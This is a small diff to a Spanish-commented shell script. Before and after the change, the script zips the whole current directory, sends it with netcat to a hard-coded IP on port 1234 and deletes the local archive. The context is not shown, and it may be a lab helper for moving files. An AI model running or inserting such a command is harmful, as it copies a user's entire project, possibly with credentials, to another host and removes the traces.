@@ -1,7 +1,8 @@
-# Comprimimos el archivo
-zip -q -r dadb.zip .
+# Comprimimos el projecto
+zip -q -r project.zip .
 
 # Lo enviamos al puerto 1234 del host
-nc 172.22.113.27 1234 < dadb.zip
+nc -v 10.245.169.129 1234 < project.zip
 
-rm dadb.zip
+# Eliminamos el archivo
+rm project.zip
